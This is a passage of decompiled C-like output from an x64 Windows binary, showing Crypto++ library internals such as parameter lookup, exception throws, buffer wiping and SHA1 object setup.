    sub_13F1053B0(v10, (const __m128i *)"Unflushable<T>: this object has buffered input that cannot be flushed");
    sub_13F1016B0((__int64)pExceptionObject, v10);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVCannotFlush_CryptoPP__);
  }
  v8 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 336i64))(a1);
  if ( v8 && a4 )
    return (*(__int64 (__fastcall **)(__int64, __int64, _QWORD, _QWORD))(*(_QWORD *)v8 + 296i64))(
             v8,
             a2,
             a3,
             (unsigned int)(a4 - 1));
  else
    return 0i64;
}
// 13F188A30: using guessed type __int64 (__fastcall *off_13F188A30[50])();
// 13F104D10: using guessed type __m128i var_90[2];

//----- (000000013F104DE0) ----------------------------------------------------
__int64 __fastcall sub_13F104DE0(__int64 a1, unsigned __int8 a2, unsigned int a3, char a4)
{
  return (*(__int64 (__fastcall **)(__int64, __int64 *, _QWORD, _QWORD, char))(*(_QWORD *)a1 + 296i64))(
           a1,
           &qword_13F1B7008,
           a2,
           a3,
           a4);
}
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F104E10) ----------------------------------------------------
__int64 __fastcall sub_13F104E10(__int64 a1, _QWORD *a2)
{
  sub_13F102D40((__int64)a2, a1);
  *a2 = off_13F183740;
  return sub_13F105FC0((__int64)(a2 + 4), a1 + 32);
}
// 13F183740: using guessed type __int64 (__fastcall *off_13F183740[4])();

//----- (000000013F104E60) ----------------------------------------------------
void __fastcall sub_13F104E60(__int64 a1, const __m128i *a2, __int64 a3, __int64 a4)
{
  __int64 v8; // rdi
  _QWORD *v9; // rbx
  __m128i *v10; // rcx
  const __m128i *v11; // r8
  __m128i v12[2]; // [rsp+28h] [rbp-A0h] BYREF
  char pExceptionObject[120]; // [rsp+50h] [rbp-78h] BYREF

  if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1C31C0, (__int64)&qword_13F1C3E50)
    || !sub_13F114C40(a3, a4, (int *)(a1 + 32)) )
  {
    if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1C31C0, a3 + 8) )
    {
      sub_13F1053B0(v12, a2);
      sub_13F101710(
        (__int64)pExceptionObject,
        v12,
        (__int64)&CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor',
        a3);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVValueTypeMismatch_NameValuePairs_CryptoPP__);
    }
    *(_BYTE *)a4 = *(_BYTE *)(a1 + 32);
    *(_QWORD *)(a4 + 8) = *(_QWORD *)(a1 + 40);
    *(_QWORD *)(a4 + 16) = *(_QWORD *)(a1 + 48);
    v8 = a1 + 56;
    v9 = (_QWORD *)(a4 + 24);
    if ( v9 != (_QWORD *)v8 )
    {
      sub_13F1051C0(v9, *(_QWORD *)(v8 + 16));
      v10 = (__m128i *)v9[3];
      if ( v10 )
      {
        v11 = *(const __m128i **)(v8 + 24);
        if ( v11 )
          sub_13F17AFE0(v10, v9[2], v11, *(_QWORD *)(v8 + 16));
      }
    }
    v9[1] = -1i64;
  }
}
// 13F1C31C0: using guessed type __int64 qword_13F1C31C0;
// 13F1C3E50: using guessed type __int64 qword_13F1C3E50;
// 13F104E60: using guessed type __m128i var_A0[2];

//----- (000000013F104F60) ----------------------------------------------------
__int64 __fastcall sub_13F104F60(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  sub_13F102D40(a2, a1);
  *(_QWORD *)a2 = off_13F183720;
  result = *(unsigned int *)(a1 + 32);
  *(_DWORD *)(a2 + 32) = result;
  return result;
}
// 13F183720: using guessed type __int64 (__fastcall *off_13F183720[4])();

//----- (000000013F104FA0) ----------------------------------------------------
char __fastcall sub_13F104FA0(__int64 a1, const __m128i *a2, __int64 a3, _DWORD *a4)
{
  int v8; // eax
  __m128i v10[2]; // [rsp+28h] [rbp-A0h] BYREF
  char pExceptionObject[120]; // [rsp+50h] [rbp-78h] BYREF

  if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1C3E50, (__int64)&qword_13F1C3E50)
    || (LOBYTE(v8) = sub_13F114C40(a3, (__int64)a4, (int *)(a1 + 32)), !(_BYTE)v8) )
  {
    if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1C3E50, a3 + 8) )
    {
      sub_13F1053B0(v10, a2);
      sub_13F101710((__int64)pExceptionObject, v10, (__int64)&int `RTTI Type Descriptor', a3);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVValueTypeMismatch_NameValuePairs_CryptoPP__);
    }
    v8 = *(_DWORD *)(a1 + 32);
    *a4 = v8;
  }
  return v8;
}
// 13F1C3E48: using guessed type int int `RTTI Type Descriptor';
// 13F1C3E50: using guessed type __int64 qword_13F1C3E50;
// 13F104FA0: using guessed type __m128i var_A0[2];

//----- (000000013F105050) ----------------------------------------------------
__int64 __fastcall sub_13F105050(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  sub_13F102D40(a2, a1);
  *(_QWORD *)a2 = &CryptoPP::AlgorithmParametersTemplate<bool>::`vftable';
  result = *(unsigned __int8 *)(a1 + 32);
  *(_BYTE *)(a2 + 32) = result;
  return result;
}
// 13F1884D0: using guessed type void *CryptoPP::AlgorithmParametersTemplate<bool>::`vftable';

//----- (000000013F105090) ----------------------------------------------------
char __fastcall sub_13F105090(__int64 a1, const __m128i *a2, __int64 a3, char *a4)
{
  char result; // al
  __m128i v9[2]; // [rsp+28h] [rbp-A0h] BYREF
  char pExceptionObject[120]; // [rsp+50h] [rbp-78h] BYREF

  if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1C3828, (__int64)&qword_13F1C3E50)
    || (result = sub_13F114C40(a3, (__int64)a4, (int *)(a1 + 32))) == 0 )
  {
    if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1C3828, a3 + 8) )
    {
      sub_13F1053B0(v9, a2);
      sub_13F101710((__int64)pExceptionObject, v9, (__int64)&bool `RTTI Type Descriptor', a3);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVValueTypeMismatch_NameValuePairs_CryptoPP__);
    }
    result = *(_BYTE *)(a1 + 32);
    *a4 = result;
  }
  return result;
}
// 13F1C3820: using guessed type bool bool `RTTI Type Descriptor';
// 13F1C3828: using guessed type __int64 qword_13F1C3828;
// 13F1C3E50: using guessed type __int64 qword_13F1C3E50;
// 13F105090: using guessed type __m128i var_A0[2];

//----- (000000013F105140) ----------------------------------------------------
__int64 __fastcall sub_13F105140(__int64 a1)
{
  return *(unsigned int *)(a1 + 24);
}

//----- (000000013F105150) ----------------------------------------------------
void __fastcall sub_13F105150(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 24) = a2;
}

//----- (000000013F105160) ----------------------------------------------------
void __noreturn sub_13F105160()
{
  char pExceptionObject[72]; // [rsp+20h] [rbp-48h] BYREF

  sub_13F106A40((__int64)pExceptionObject);
  CxxThrowException(
    pExceptionObject,
    (_ThrowInfo *)&_TI4_AUInputRejected___InputRejecting_VBufferedTransformation_CryptoPP___CryptoPP__);
}
// 13F105160: using guessed type void __fastcall __noreturn sub_13F105160();

//----- (000000013F105180) ----------------------------------------------------
__int64 __fastcall sub_13F105180(_QWORD *a1)
{
  unsigned __int64 v1; // rdx
  void *v2; // r8
  __int64 result; // rax

  v1 = a1[2];
  if ( a1[1] < v1 )
    v1 = a1[1];
  v2 = (void *)a1[3];
  if ( v2 )
  {
    memset(v2, 0, 8 * v1);
    return sub_13F12E4D0((__int64)v2);
  }
  return result;
}

//----- (000000013F1051C0) ----------------------------------------------------
void __fastcall sub_13F1051C0(_QWORD *a1, __int64 a2)
{
  void *v4; // r8
  unsigned __int64 v5; // rcx

  v4 = (void *)a1[3];
  v5 = a1[2];
  if ( v5 != a2 )
  {
    if ( v4 )
    {
      memset(v4, 0, v5);
      sub_13F12E550(v4);
    }
    if ( a2 )
      v4 = (void *)sub_13F12E4E0(a2);
    else
      v4 = 0i64;
  }
  a1[3] = v4;
  a1[2] = a2;
  a1[1] = -1i64;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);

//----- (000000013F105240) ----------------------------------------------------
void __fastcall sub_13F105240(_QWORD *a1, const __m128i *a2, unsigned __int64 a3)
{
  __m128i *v6; // r10
  unsigned __int64 v7; // rcx

  v6 = (__m128i *)a1[3];
  v7 = a1[2];
  if ( v7 != a3 )
  {
    if ( v6 )
    {
      memset(v6, 0, v7);
      sub_13F12E550(v6);
    }
    if ( a3 )
      v6 = (__m128i *)sub_13F12E4E0(a3);
    else
      v6 = 0i64;
  }
  a1[3] = v6;
  a1[2] = a3;
  a1[1] = -1i64;
  if ( v6 && a2 )
    sub_13F17AFE0(v6, a3, a2, a3);
  a1[1] = -1i64;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);

//----- (000000013F1052E0) ----------------------------------------------------
void __fastcall sub_13F1052E0(_QWORD *a1)
{
  void *v1; // rdx
  unsigned __int64 v2; // rax
  unsigned __int64 v3; // rcx

  v1 = (void *)a1[3];
  if ( v1 )
  {
    v2 = a1[1];
    v3 = a1[2];
    if ( v2 < v3 )
      v3 = v2;
    memset(v1, 0, v3);
    sub_13F12E550(v1);
  }
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);

//----- (000000013F105320) ----------------------------------------------------
void __fastcall sub_13F105320(__int64 *a1)
{
  int v1; // eax

  v1 = sub_13F10A264(*a1);
  if ( v1 )
    sub_13F109DF8(v1);
}

//----- (000000013F105350) ----------------------------------------------------
__int64 __fastcall sub_13F105350(__int64 *a1)
{
  unsigned __int64 v1; // rdx
  __int64 v3; // rcx
  unsigned __int64 v4; // rdx
  __int64 result; // rax

  v1 = a1[3];
  if ( v1 >= 0x10 )
  {
    v3 = *a1;
    v4 = v1 + 1;
    if ( v4 >= 0x1000 )
    {
      v4 += 39i64;
      if ( (unsigned __int64)(v3 - *(_QWORD *)(v3 - 8) - 8) > 0x1F )
        sub_13F1682C0();
      v3 = *(_QWORD *)(v3 - 8);
    }
    result = sub_13F14088C(v3, v4);
  }
  a1[2] = 0i64;
  a1[3] = 15i64;
  *(_BYTE *)a1 = 0;
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F1053B0) ----------------------------------------------------
__m128i *__fastcall sub_13F1053B0(__m128i *a1, const __m128i *a2)
{
  unsigned __int64 v3; // r8

  a1[1].m128i_i64[0] = 0i64;
  a1[1].m128i_i64[1] = 15i64;
  v3 = -1i64;
  a1->m128i_i8[0] = 0;
  do
    ++v3;
  while ( a2->m128i_i8[v3] );
  sub_13F106C50(a1, a2, v3);
  return a1;
}

//----- (000000013F1053F0) ----------------------------------------------------
__m128i **__fastcall sub_13F1053F0(__m128i **a1, const __m128i *a2)
{
  __m128i *v2; // rax
  const __m128i *v3; // rdi
  unsigned __int64 v5; // rbp
  __int64 v6; // rsi
  __int64 v7; // rcx
  __int64 v8; // rax
  __int64 v9; // rcx
  __m128i **result; // rax

  v2 = 0i64;
  v3 = a2;
  a1[2] = 0i64;
  a1[3] = 0i64;
  v5 = a2[1].m128i_u64[0];
  if ( a2[1].m128i_i64[1] >= 0x10ui64 )
    v3 = (const __m128i *)a2->m128i_i64[0];
  if ( v5 >= 0x10 )
  {
    v6 = v5 | 0xF;
    if ( (v5 | 0xF) > 0x7FFFFFFFFFFFFFFFi64 )
      v6 = 0x7FFFFFFFFFFFFFFFi64;
    if ( (unsigned __int64)(v6 + 1) < 0x1000 )
    {
      if ( v6 != -1 )
        v2 = (__m128i *)sub_13F14059C(v6 + 1);
    }
    else
    {
      v7 = v6 + 40;
      if ( v6 + 40 <= (unsigned __int64)(v6 + 1) )
        v7 = -1i64;
      v8 = sub_13F14059C(v7);
      v9 = v8;
      if ( !v8 )
        sub_13F1682C0();
      v2 = (__m128i *)((v8 + 39) & 0xFFFFFFFFFFFFFFE0ui64);
      v2[-1].m128i_i64[1] = v9;
    }
    *a1 = v2;
    sub_13F15EB00(v2, v3, v5 + 1);
  }
  else
  {
    v6 = 15i64;
    *(__m128i *)a1 = *v3;
  }
  a1[2] = (__m128i *)v5;
  result = a1;
  a1[3] = (__m128i *)v6;
  return result;
}

//----- (000000013F1054C0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1054C0(_QWORD *a1, char a2)
{
  sub_13F103F20(a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 96i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F105500) ----------------------------------------------------
_QWORD *__fastcall sub_13F105500(_QWORD *a1)
{
  _QWORD *v2; // rbx

  sub_13F10EE30((__int64)(a1 + 1), 1);
  v2 = a1 + 3;
  a1[5] = qword_13F19BE58;
  a1[18] = &CryptoPP::NameValuePairs::`vftable';
  a1[4] = off_13F186288;
  *(_QWORD *)((char *)v2 + *(int *)(a1[5] + 4i64) + 16) = off_13F1862D8;
  a1[3] = off_13F186408;
  a1[4] = off_13F186450;
  *(_QWORD *)((char *)v2 + *(int *)(a1[5] + 4i64) + 16) = off_13F1864A0;
  sub_13F112CF0((__int64)(a1 + 6));
  sub_13F112CF0((__int64)(a1 + 12));
  *a1 = off_13F1869B8;
  a1[1] = off_13F186A10;
  a1[2] = off_13F186A58;
  return a1;
}
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 13F186288: using guessed type __int64 (__fastcall *off_13F186288[10])();
// 13F1862D8: using guessed type void *off_13F1862D8[12];
// 13F186408: using guessed type __int64 (__fastcall *off_13F186408[9])();
// 13F186450: using guessed type __int64 (__fastcall *off_13F186450[10])();
// 13F1864A0: using guessed type void *off_13F1864A0[12];
// 13F1869B8: using guessed type __int64 (__fastcall *off_13F1869B8[11])();
// 13F186A10: using guessed type void *off_13F186A10[9];
// 13F186A58: using guessed type void *off_13F186A58[4];
// 13F19BE58: using guessed type __int64 qword_13F19BE58[2];

//----- (000000013F1055F0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1055F0(_QWORD *a1)
{
  _QWORD *v2; // rdi

  sub_13F10EE30((__int64)(a1 + 1), 1);
  v2 = a1 + 3;
  a1[5] = qword_13F19BD70;
  a1[21] = qword_13F19C008;
  a1[68] = &CryptoPP::NameValuePairs::`vftable';
  a1[4] = off_13F186288;
  *(_QWORD *)((char *)v2 + *(int *)(a1[5] + 4i64) + 16) = off_13F1862D8;
  a1[3] = off_13F186408;
  a1[4] = off_13F186450;
  *(_QWORD *)((char *)v2 + *(int *)(a1[5] + 4i64) + 16) = off_13F1864A0;
  sub_13F112CF0((__int64)(a1 + 6));
  sub_13F112CF0((__int64)(a1 + 12));
  a1[19] = off_13F186338;
  a1[20] = off_13F186398;
  *(_QWORD *)((char *)a1 + *(int *)(a1[21] + 4i64) + 168) = off_13F1863A8;
  sub_13F131450((__int64)(a1 + 22), 0i64);
  a1[3] = off_13F186500;
  a1[4] = off_13F186548;
  a1[18] = off_13F186598;
  a1[19] = off_13F1865C0;
  a1[20] = off_13F186620;
  *(_QWORD *)((char *)a1 + *(int *)(a1[5] + 4i64) + 40) = off_13F186630;
  sub_13F112CF0((__int64)(a1 + 32));
  sub_13F112CF0((__int64)(a1 + 38));
  sub_13F112CF0((__int64)(a1 + 44));
  sub_13F112CF0((__int64)(a1 + 50));
  sub_13F112CF0((__int64)(a1 + 56));
  sub_13F112CF0((__int64)(a1 + 62));
  *a1 = off_13F1868F0;
  a1[1] = off_13F186948;
  a1[2] = off_13F186990;
  return a1;
}
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 13F186288: using guessed type __int64 (__fastcall *off_13F186288[10])();
// 13F1862D8: using guessed type void *off_13F1862D8[12];
// 13F186338: using guessed type __int64 (__fastcall *off_13F186338[12])();
// 13F186398: using guessed type __int64 (__fastcall *off_13F186398[2])();
// 13F1863A8: using guessed type void *off_13F1863A8[12];
// 13F186408: using guessed type __int64 (__fastcall *off_13F186408[9])();
// 13F186450: using guessed type __int64 (__fastcall *off_13F186450[10])();
// 13F1864A0: using guessed type void *off_13F1864A0[12];
// 13F186500: using guessed type __int64 (__fastcall *off_13F186500[9])();
// 13F186548: using guessed type void *off_13F186548[10];
// 13F186598: using guessed type void *off_13F186598[5];
// 13F1865C0: using guessed type void *off_13F1865C0[12];
// 13F186620: using guessed type __int64 (__fastcall *off_13F186620[2])();
// 13F186630: using guessed type void *off_13F186630[12];
// 13F1868F0: using guessed type __int64 (__fastcall *off_13F1868F0[11])();
// 13F186948: using guessed type void *off_13F186948[9];
// 13F186990: using guessed type void *off_13F186990[5];
// 13F19BD70: using guessed type __int64 qword_13F19BD70[4];
// 13F19C008: using guessed type __int64 qword_13F19C008[2];

//----- (000000013F1057D0) ----------------------------------------------------
__int64 __fastcall sub_13F1057D0(__int64 a1)
{
  _DWORD *v2; // rcx
  __int64 v3; // rdx

  sub_13F10EE30(a1, 1);
  v2 = 0i64;
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_BYTE *)(a1 + 81) = 0;
  *(_QWORD *)(a1 + 88) = 0x3FFFFFFFFFFFFFFFi64;
  *(_QWORD *)(a1 + 96) = 16i64;
  if ( *(_BYTE *)(a1 + 81) )
  {
    v3 = 0i64;
  }
  else
  {
    *(_BYTE *)(a1 + 81) = 1;
    v3 = a1 + 16;
  }
  *(_QWORD *)(a1 + 104) = v3;
  *(_BYTE *)(a1 + 177) = 0;
  *(_QWORD *)(a1 + 184) = 0x3FFFFFFFFFFFFFFFi64;
  *(_QWORD *)(a1 + 192) = 16i64;
  if ( !*(_BYTE *)(a1 + 177) )
  {
    *(_BYTE *)(a1 + 177) = 1;
    v2 = (_DWORD *)(a1 + 112);
  }
  *(_QWORD *)(a1 + 200) = v2;
  sub_13F12F4B0(v2);
  *(_QWORD *)a1 = &CryptoPP::SHA1::`vftable';
  return a1;
}
// 13F1856E0: using guessed type void *CryptoPP::SHA1::`vftable';

//----- (000000013F105870) ----------------------------------------------------
__int64 __fastcall sub_13F105870(__int64 a1)
{
  unsigned __int64 v1; // rdx
  __int64 v2; // rcx
  _DWORD *v3; // rdi
  __int64 result; // rax
  unsigned __int64 i; // rcx

  v1 = *(_QWORD *)(a1 + 96);
  v2 = a1 + 16;
  v3 = *(_DWORD **)(v2 + 88);
  if ( *(_QWORD *)(v2 + 72) < v1 )
    v1 = *(_QWORD *)(v2 + 72);
  *(_BYTE *)(v2 + 65) = 0;
  if ( v3 == (_DWORD *)v2 )
  {
    result = 0i64;
    for ( i = v1; i; --i )
      *v3++ = 0;
  }
  return result;
}

//----- (000000013F1058A0) ----------------------------------------------------
__int64 __fastcall sub_13F1058A0(__int64 a1)
{
  unsigned __int64 v1; // rdx
  _DWORD *v2; // rdi
  __int64 result; // rax
  unsigned __int64 i; // rcx

  v1 = *(_QWORD *)(a1 + 80);
  v2 = *(_DWORD **)(a1 + 88);
  if ( *(_QWORD *)(a1 + 72) < v1 )
    v1 = *(_QWORD *)(a1 + 72);
  *(_BYTE *)(a1 + 65) = 0;
  if ( v2 == (_DWORD *)a1 )
  {
    result = 0i64;
    for ( i = v1; i; --i )
      *v2++ = 0;
  }
  return result;
}

//----- (000000013F1058D0) ----------------------------------------------------
__int64 __fastcall sub_13F1058D0(__int64 a1, const __m128i *a2)
{
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  sub_13F15E46C((__int64)&a2->m128i_i64[1], a1 + 8);
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = a2[1].m128i_i32[2];
  sub_13F1053F0((__m128i **)(a1 + 32), a2 + 2);
  *(_QWORD *)a1 = off_13F188BC0;
  return a1;
}
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F188BC0: using guessed type __int64 (__fastcall *off_13F188BC0[2])();

//----- (000000013F105950) ----------------------------------------------------
_QWORD *__fastcall sub_13F105950(_QWORD *a1, char a2)
{
  *a1 = off_13F1884F0;
  a1[1] = off_13F188660;
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 32i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1884F0: using guessed type __int64 (__fastcall *off_13F1884F0[46])();
// 13F188660: using guessed type void *off_13F188660[4];

//----- (000000013F105990) ----------------------------------------------------
__int64 __fastcall sub_13F105990(__int64 a1, const __m128i *a2)
{
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  sub_13F15E46C((__int64)&a2->m128i_i64[1], a1 + 8);
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = a2[1].m128i_i32[2];
  sub_13F1053F0((__m128i **)(a1 + 32), a2 + 2);
  *(_QWORD *)a1 = off_13F183410;
  return a1;
}
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F183410: using guessed type __int64 (__fastcall *off_13F183410[3])();

//----- (000000013F105A10) ----------------------------------------------------
__int64 __fastcall sub_13F105A10(__int64 a1, const __m128i *a2)
{
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  sub_13F15E46C((__int64)&a2->m128i_i64[1], a1 + 8);
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = a2[1].m128i_i32[2];
  sub_13F1053F0((__m128i **)(a1 + 32), a2 + 2);
  *(_QWORD *)a1 = &CryptoPP::InputRejecting<CryptoPP::BufferedTransformation>::InputRejected::`vftable';
  return a1;
}
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F181D20: using guessed type void *CryptoPP::InputRejecting<CryptoPP::BufferedTransformation>::InputRejected::`vftable';

//----- (000000013F105A90) ----------------------------------------------------
void **__fastcall sub_13F105A90(_QWORD *a1)
{
  __int64 v2; // rdx
  __int64 v3; // rcx
  void *v4; // rdx
  __int64 v5; // rcx
  void *v6; // rdx
  void **result; // rax

  v2 = 12i64;
  if ( a1[11] < a1[12] )
    v2 = 11i64;
  v3 = a1[v2];
  v4 = (void *)a1[13];
  if ( v4 )
  {
    memset(v4, 0, 8 * v3);
    sub_13F12E4D0((__int64)v4);
  }
  v5 = 6i64;
  if ( a1[5] < a1[6] )
    v5 = 5i64;
  v6 = (void *)a1[7];
  if ( v6 )
  {
    memset(v6, 0, 8i64 * a1[v5]);
    sub_13F12E4D0((__int64)v6);
  }
  a1[1] = off_13F186288;
  result = off_13F1862D8;
  *(_QWORD *)((char *)a1 + *(int *)(a1[2] + 4i64) + 16) = off_13F1862D8;
  return result;
}
// 13F186288: using guessed type __int64 (__fastcall *off_13F186288[10])();
// 13F1862D8: using guessed type void *off_13F1862D8[12];

//----- (000000013F105B40) ----------------------------------------------------
void **__fastcall sub_13F105B40(_QWORD *a1)
{
  __int64 v2; // rdx
  __int64 v3; // rcx
  void *v4; // rdx
  __int64 v5; // rcx
  void *v6; // rdx
  __int64 v7; // rcx
  void *v8; // rdx
  __int64 v9; // rcx
  void *v10; // rdx
  __int64 v11; // rcx
  void *v12; // rdx
  __int64 v13; // rcx
  void *v14; // rdx

  v2 = 62i64;
  if ( a1[61] < a1[62] )
    v2 = 61i64;
  v3 = a1[v2];
  v4 = (void *)a1[63];
  if ( v4 )
  {
    memset(v4, 0, 8 * v3);
    sub_13F12E4D0((__int64)v4);
  }
  v5 = 56i64;
  if ( a1[55] < a1[56] )
    v5 = 55i64;
  v6 = (void *)a1[57];
  if ( v6 )
  {
    memset(v6, 0, 8i64 * a1[v5]);
    sub_13F12E4D0((__int64)v6);
  }
  v7 = 50i64;
  if ( a1[49] < a1[50] )
    v7 = 49i64;
  v8 = (void *)a1[51];
  if ( v8 )
  {
    memset(v8, 0, 8i64 * a1[v7]);
    sub_13F12E4D0((__int64)v8);
  }
  v9 = 44i64;
  if ( a1[43] < a1[44] )
    v9 = 43i64;
  v10 = (void *)a1[45];
  if ( v10 )
  {
    memset(v10, 0, 8i64 * a1[v9]);
    sub_13F12E4D0((__int64)v10);
  }
  v11 = 38i64;
  if ( a1[37] < a1[38] )
    v11 = 37i64;
  v12 = (void *)a1[39];
  if ( v12 )
  {
    memset(v12, 0, 8i64 * a1[v11]);
    sub_13F12E4D0((__int64)v12);
  }
  v13 = 32i64;
  if ( a1[31] < a1[32] )
    v13 = 31i64;
  v14 = (void *)a1[33];
  if ( v14 )
  {
    memset(v14, 0, 8i64 * a1[v13]);
    sub_13F12E4D0((__int64)v14);
  }
  a1[16] = off_13F186338;
  a1[17] = off_13F186398;
  *(_QWORD *)((char *)a1 + *(int *)(a1[18] + 4i64) + 144) = off_13F1863A8;
  sub_13F1315A0(a1 + 19);
  return sub_13F105A90(a1);
}
// 13F186338: using guessed type __int64 (__fastcall *off_13F186338[12])();
// 13F186398: using guessed type __int64 (__fastcall *off_13F186398[2])();
// 13F1863A8: using guessed type void *off_13F1863A8[12];

//----- (000000013F105D20) ----------------------------------------------------
__int64 __fastcall sub_13F105D20(__int64 a1, char a2)
{
  sub_13F105A90((_QWORD *)(a1 + 24));
  *(_QWORD *)(a1 + 144) = &CryptoPP::NameValuePairs::`vftable';
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 152i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (000000013F105D80) ----------------------------------------------------
__int64 __fastcall sub_13F105D80(__int64 a1, char a2)
{
  sub_13F105B40((_QWORD *)(a1 + 24));
  *(_QWORD *)(a1 + 544) = &CryptoPP::NameValuePairs::`vftable';
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 552i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (000000013F105DE0) ----------------------------------------------------
__int64 __fastcall sub_13F105DE0(__int64 a1, char a2)
{
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 8i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F105E10) ----------------------------------------------------
__int64 __fastcall sub_13F105E10(__int64 a1, char a2)
{
  __int64 v2; // r8
  unsigned __int64 v4; // rcx
  _DWORD *v5; // rdi
  unsigned __int64 v6; // rcx
  _DWORD *v7; // rdi

  v2 = a1 + 112;
  v4 = *(_QWORD *)(a1 + 192);
  v5 = *(_DWORD **)(v2 + 88);
  if ( *(_QWORD *)(v2 + 72) < v4 )
    v4 = *(_QWORD *)(v2 + 72);
  *(_BYTE *)(v2 + 65) = 0;
  if ( v5 == (_DWORD *)v2 )
  {
    while ( v4 )
    {
      *v5++ = 0;
      --v4;
    }
  }
  v6 = *(_QWORD *)(a1 + 96);
  v7 = *(_DWORD **)(a1 + 104);
  if ( *(_QWORD *)(a1 + 88) < v6 )
    v6 = *(_QWORD *)(a1 + 88);
  *(_BYTE *)(a1 + 81) = 0;
  if ( v7 == (_DWORD *)(a1 + 16) )
  {
    while ( v6 )
    {
      *v7++ = 0;
      --v6;
    }
  }
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 208i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F105E90) ----------------------------------------------------
__int64 __fastcall sub_13F105E90(__int64 a1)
{
  __int64 v1; // rdx
  unsigned __int64 v3; // rcx
  _DWORD *v4; // rdi
  __int64 result; // rax
  unsigned __int64 v6; // rcx
  _DWORD *v7; // rdi

  v1 = a1 + 112;
  v3 = *(_QWORD *)(a1 + 192);
  v4 = *(_DWORD **)(v1 + 88);
  if ( *(_QWORD *)(v1 + 72) < v3 )
    v3 = *(_QWORD *)(v1 + 72);
  *(_BYTE *)(v1 + 65) = 0;
  if ( v4 == (_DWORD *)v1 )
  {
    result = 0i64;
    while ( v3 )
    {
      *v4++ = 0;
      --v3;
    }
  }
  v6 = *(_QWORD *)(a1 + 96);
  v7 = *(_DWORD **)(a1 + 104);
  if ( *(_QWORD *)(a1 + 88) < v6 )
    v6 = *(_QWORD *)(a1 + 88);
  *(_BYTE *)(a1 + 81) = 0;
  if ( v7 == (_DWORD *)(a1 + 16) )
  {
    result = 0i64;
    while ( v6 )
    {
      *v7++ = 0;
      --v6;
    }
  }
  return result;
}

//----- (000000013F105EF0) ----------------------------------------------------
__int64 __fastcall sub_13F105EF0(__int64 a1, char a2)
{
  __int64 v4; // rdi
  unsigned __int64 v5; // rcx
  void *v6; // rdx
  void (__fastcall ***v7)(_QWORD, __int64); // rcx
  char pExceptionObject[64]; // [rsp+30h] [rbp-48h] BYREF

  v4 = 72i64;
  if ( *(_QWORD *)(a1 + 64) < *(_QWORD *)(a1 + 72) )
    v4 = 64i64;
  v5 = *(_QWORD *)(v4 + a1);
  v6 = *(void **)(a1 + 80);
  if ( v6 )
  {
    memset(v6, 0, v5);
    sub_13F12E550(v6);
  }
  *(_QWORD *)a1 = off_13F183700;
  if ( !(unsigned int)sub_13F109700(v5) && *(_BYTE *)(a1 + 16) && !*(_BYTE *)(a1 + 17) )
  {
    sub_13F102A80((__int64)pExceptionObject, *(const __m128i **)(a1 + 8));
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVParameterNotUsed_AlgorithmParametersBase_CryptoPP__);
  }
  v7 = *(void (__fastcall ****)(_QWORD, __int64))(a1 + 24);
